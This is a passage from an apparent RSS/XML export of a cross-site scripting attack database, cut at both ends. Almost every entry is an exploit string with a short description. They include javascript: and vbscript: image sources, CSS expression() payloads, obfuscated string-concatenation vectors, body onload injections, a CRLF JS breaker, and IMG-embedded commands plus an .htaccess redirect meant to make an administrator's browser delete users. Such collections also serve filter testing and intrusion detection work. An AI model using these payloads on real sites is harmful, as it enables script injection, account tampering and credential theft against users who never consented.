     <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.</ddb:exploitDescription>      <ddb:exploitName>IMG Embedded commands 1</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>IMG Embedded commands 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1885</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG Embedded commands 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal &lt;IMG SRC=”http://badguy.com/a.jpg”&gt; could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, redirect&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:15:39 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal &lt;IMG SRC=”http://badguy.com/a.jpg”&gt; could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).</ddb:exploitDescription>      <ddb:exploitName>IMG Embedded commands 2</ddb:exploitName>      <ddb:exploitString>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</ddb:exploitString>      <ddb:exploitTags>general, redirect</ddb:exploitTags>    </item>    <item>      <title>IMG Lowsrc</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1883</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG Lowsrc&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG LOWSRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;IMG Lowsrc&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:15:06 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>IMG Lowsrc</ddb:exploitDescription>      <ddb:exploitName>IMG Lowsrc</ddb:exploitName>      <ddb:exploitString>&lt;IMG LOWSRC=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IMG No Quotes/Semicolon</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1881</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG No Quotes/Semicolon&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=javascript:alert('XSS')&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;No quotes and no semicolon&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:14:46 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>No quotes and no semicolon</ddb:exploitDescription>      <ddb:exploitName>IMG No Quotes/Semicolon</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=javascript:alert('XSS')&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IMG STYLE w/expression</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1886</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG STYLE w/expression&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;exp/*&lt;XSS STYLE='no\xss:noxss(&quot;*//*&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))'&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:17:02 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).</ddb:exploitDescription>      <ddb:exploitName>IMG STYLE w/expression</ddb:exploitName>      <ddb:exploitString>exp/*&lt;XSS STYLE='no\xss:noxss(&quot;*//*&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))'&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IMG w/JavaScript Directive</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1880</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG w/JavaScript Directive&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Image XSS using the JavaScript directive.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:14:40 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Image XSS using the JavaScript directive.</ddb:exploitDescription>      <ddb:exploitName>IMG w/JavaScript Directive</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IMG w/VBscript</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1888</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG w/VBscript&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;VBscript in an image&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:18:22 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>VBscript in an image</ddb:exploitDescription>      <ddb:exploitName>IMG w/VBscript</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>INPUT Image</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1879</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;INPUT Image&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;INPUT Image&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:14:30 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>INPUT Image</ddb:exploitDescription>      <ddb:exploitName>INPUT Image</ddb:exploitName>      <ddb:exploitString>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IP Encoding</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1964</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IP Encoding&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:51:39 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).</ddb:exploitDescription>      <ddb:exploitName>IP Encoding</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript concatenation vector variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7233</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript concatenation vector variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector concatenates a string and evaluates it via mapping on URL  &lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, internet explorer, concatenated, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 07:55:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector concatenates a string and evaluates it via mapping on URL  </ddb:exploitDescription>      <ddb:exploitName>JavaScript concatenation vector variant 1</ddb:exploitName>      <ddb:exploitString>s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1</ddb:exploitString>      <ddb:exploitTags>general, internet explorer, concatenated, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript concatenation vector variant 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7177</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript concatenation vector variant 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector concatenates a string and evaluates it via self-execution.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, concatenated, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 07:52:01 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector concatenates a string and evaluates it via self-execution.</ddb:exploitDescription>      <ddb:exploitName>JavaScript concatenation vector variant 2</ddb:exploitName>      <ddb:exploitString>s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;</ddb:exploitString>      <ddb:exploitTags>general, concatenated, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript concatenation vector variant 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7247</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript concatenation vector variant 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector concatenates a string and evaluates it via usage of common DOM methods and element creation.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, concatenated, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 07:53:21 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector concatenates a string and evaluates it via usage of common DOM methods and element creation.</ddb:exploitDescription>      <ddb:exploitName>JavaScript concatenation vector variant 3</ddb:exploitName>      <ddb:exploitString>s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);</ddb:exploitString>      <ddb:exploitTags>general, concatenated, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript concatenation vector variant 4</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7259</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript concatenation vector variant 4&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JSON, concatenated, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 07:55:37 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.</ddb:exploitDescription>      <ddb:exploitName>JavaScript concatenation vector variant 4</ddb:exploitName>      <ddb:exploitString>s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];</ddb:exploitString>      <ddb:exploitTags>general, JSON, concatenated, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript concatenation vector variant 5</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7293</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript concatenation vector variant 5&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JSON, concatenated, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 07:56:40 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.</ddb:exploitDescription>      <ddb:exploitName>JavaScript concatenation vector variant 5</ddb:exploitName>      <ddb:exploitString>s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];</ddb:exploitString>      <ddb:exploitTags>general, JSON, concatenated, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript concatenation vector variant 6</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7583</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript concatenation vector variant 6&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=!''&amp;&amp;'jav';s2=!''&amp;&amp;'ascript';s3=!''&amp;&amp;':';s4=!''&amp;&amp;'aler';s5=!''&amp;&amp;'t';s6=!''&amp;&amp;'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector concatenates a string and evaluates it via filling the URL property with payload concatenated in a string  via ternary operators.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, internet explorer, concatenated, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 08:15:02 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector concatenates a string and evaluates it via filling the URL property with payload concatenated in a string  via ternary operators.</ddb:exploitDescription>      <ddb:exploitName>JavaScript concatenation vector variant 6</ddb:exploitName>      <ddb:exploitString>s1=!''&amp;&amp;'jav';s2=!''&amp;&amp;'ascript';s3=!''&amp;&amp;':';s4=!''&amp;&amp;'aler';s5=!''&amp;&amp;'t';s6=!''&amp;&amp;'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;</ddb:exploitString>      <ddb:exploitTags>general, internet explorer, concatenated, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript concatenation vector variant 7</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7417</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript concatenation vector variant 7&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a regular string via ternary operators.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JSON, concatenated, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Thu, 01 Nov 07 15:44:55 -0500</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a regular string via ternary operators.</ddb:exploitDescription>      <ddb:exploitName>JavaScript concatenation vector variant 7</ddb:exploitName>      <ddb:exploitString>s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';</ddb:exploitString>      <ddb:exploitTags>general, JSON, concatenated, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript Includes</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1923</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript Includes&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;BR SIZE=&quot;&amp;{alert('XSS')}&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;&amp;JavaScript includes (works in Netscape 4.x).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:51:52 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>&amp;JavaScript includes (works in Netscape 4.x).</ddb:exploitDescription>      <ddb:exploitName>JavaScript Includes</ddb:exploitName>      <ddb:exploitString>&lt;BR SIZE=&quot;&amp;{alert('XSS')}&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JavaScript Link Location</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1976</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript Link Location&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;javascript:document.location='http://www.google.com/'&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed)&lt;br&gt;JavaScript link location&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, redirect&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:00:02 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed)&#13;&#10;JavaScript link location</ddb:exploitDescription>      <ddb:exploitName>JavaScript Link Location</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;javascript:document.location='http://www.google.com/'&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, redirect</ddb:exploitTags>    </item>    <item>      <title>JavaScript-breaker using carriage return</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1828</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JavaScript-breaker using carriage return&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;%0da=eval;b=alert;a(b(/d/.source));&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses an urlencoded carriage return to break JS code and produce an alert afterwards.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, CRLF&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Mon, 13 Aug 07 10:38:02 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses an urlencoded carriage return to break JS code and produce an alert afterwards.</ddb:exploitDescription>      <ddb:exploitName>JavaScript-breaker using carriage return</ddb:exploitName>      <ddb:exploitString>%0da=eval;b=alert;a(b(/d/.source));</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, CRLF</ddb:exploitTags>    </item>    <item>      <title>JS link with whitespace obfuscation</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2042</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JS link with whitespace obfuscation&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;a href          =              &quot;javas  cript   :ale                            rt(1)&quot;&gt;test&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes whitespace to obfuscate and contains a JS link.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Fri, 03 Aug 07 08:34:16 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes whitespace to obfuscate and contains a JS link.</ddb:exploitDescription>      <ddb:exploitName>JS link with whitespace obfuscation</ddb:exploitName>      <ddb:exploitString>&lt;a href          =              &quot;javas  cript   :ale                            rt(1)&quot;&gt;test</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JS string concatenation breaker</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1857</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JS string concatenation breaker&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;+alert(0)+&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This can be used when input is concatenated in JavaScript.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This can be used when input is concatenated in JavaScript.</ddb:exploitDescription>      <ddb:exploitName>JS string concatenation breaker</ddb:exploitName>      <ddb:exploitString>+alert(0)+</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic</ddb:exploitTags>    </item>    <item>      <title>JSON based obfuscated onload vector</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2043</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JSON based obfuscated onload vector&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector injects a new body tag and utilized the onload event to modify the DOM. JSON parenthesis and semicolons are to evade filters.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, JSON, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Fri, 03 Aug 07 08:35:30 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector injects a new body tag and utilized the onload event to modify the DOM. JSON parenthesis and semicolons are to evade filters.</ddb:exploitDescription>      <ddb:exploitName>JSON based obfuscated onload vector</ddb:exploitName>      <ddb:exploitString>&lt;body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, JSON, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JSON based onload vector</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2037</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JSON based onload vector&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;body onload=a1={x:this.parent.document};a1.x.writeln(1);&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector injects a new body tag and utilized the onload event to modify the DOM&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, JSON, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Fri, 03 Aug 07 08:27:12 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector injects a new body tag and utilized the onload event to modify the DOM</ddb:exploitDescription>      <ddb:exploitName>JSON based onload vector</ddb:exploitName>      <ddb:exploitString>&lt;body onload=a1={x:this.parent.document};a1.x.writeln(1);&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, JSON, obfuscated</ddb:exploitTags>    </item>    <item>      <title>JSON based semicolon-onload vector</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2039</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;JSON based semicolon-onload vector&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector injects a new body 